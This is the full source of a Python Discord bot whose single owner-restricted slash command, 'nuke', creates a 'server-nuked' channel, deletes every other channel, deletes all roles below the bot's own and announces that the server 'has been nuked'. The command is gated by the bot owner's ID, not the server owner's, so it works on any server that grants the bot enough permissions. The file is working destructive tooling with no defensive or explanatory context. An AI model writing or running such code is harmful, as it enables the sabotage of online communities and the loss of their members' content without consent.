import discord
import os
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID"))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"✅ Slash commands synchronized: {len(synced)} commands")
    except Exception as e:
        print(f"❌ Error while syncing: {e}")
    print(f"✅ Logged in as {bot.user}")

@bot.tree.command(name="nuke", description="Nuke a Server")
async def nuke(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("🚫 You do not have permission for this command.", ephemeral=True)
        return

    guild = interaction.guild

    new_channel = await guild.create_text_channel("server-nuked")
    await interaction.response.send_message("💥 Server is now being nuked...", ephemeral=True)

    for channel in guild.channels:
        if channel != new_channel:
            try:
                await channel.delete()
                await new_channel.send(f"🗑️ Deleted channel: `{channel.name}`")
            except Exception as e:
                await new_channel.send(f"❌ Failed to delete `{channel.name}`: {e}")

    bot_role = guild.me.top_role
    roles_to_delete = sorted(
        [role for role in guild.roles if role != guild.default_role and role < bot_role],
        key=lambda r: r.position,
        reverse=True
    )

    for role in roles_to_delete:
        try:
            await role.delete()
            await new_channel.send(f"🗑️ Deleted role: `{role.name}`")
        except Exception as e:
            await new_channel.send(f"❌ Failed to delete `{role.name}`: {e}")

    await new_channel.send("💥 **Server has been nuked!**")

bot.run(TOKEN)
